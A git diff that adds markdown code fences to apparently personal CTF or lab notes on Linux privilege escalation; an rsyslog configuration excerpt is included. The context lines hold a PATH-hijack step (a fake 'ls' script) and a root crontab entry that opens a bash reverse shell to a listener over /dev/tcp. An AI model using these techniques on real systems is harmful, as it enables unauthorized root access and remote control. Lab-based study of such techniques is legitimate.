@@ -1257,7 +1257,7 @@ find / -type d -perm /2 -ls 2>/dev/null
 
 
 
-
+```
 DEMO:
 
 
@@ -1305,8 +1305,8 @@ The flag is located in this users home directory.
 
 
 MCNUTS: In this particular case the most advantage that can be taken out of the command ran by user BillyBob is to obtain the path to a shell as it follows.
-
-
+```
+```
 ----------Create this script and call it ls---------------
 #!/bin/bash
 # script that sends information to a remote system.
@@ -1325,6 +1325,8 @@ type /bin/ls or id to ac
 
 
 -----------------------------------------------------------------------------------------------
+```
+```
 ESCALATING PRIVILEGES THROUGH SUID:
 
 
@@ -1345,6 +1347,8 @@ USE CRONTAB TO SEND FROM MY BOX TO A LISTENER
 vim crontab 
 * * * * * root /bin/bash -i > /dev/tcp/192.168.28.135/33403 0<&1 2>&1 
 ---------------------------------------------------------------------------------------------------------------
+```
+```
 # RSYSLOG.CONF
 #  /etc/rsyslog.conf	Configuration file for rsyslog.
 #
@@ -1402,9 +1406,11 @@ $IncludeConfig /etc/rsyslog.d/*.conf
 ###############
 #### RULES ####
 ###############
+```
 
-#
 # First some standard log files.  Log by facility.
+
+```
 #
 #auth,authpriv.*		/var/log/auth.log
 #*.*;auth,authpriv.none		-/var/log/syslog
@@ -1438,7 +1444,7 @@ mail.err			/var/log/mail.err
 # *.*       @@192.0.2.1:13232
 *.* action(type="omfwd" target="193.0.12.1" port="10514" protocol="udp")
 #*.* action(type="omfwd" target="192.0.42.1" port="1514" protocol="udp")
-
+```
 
 
 
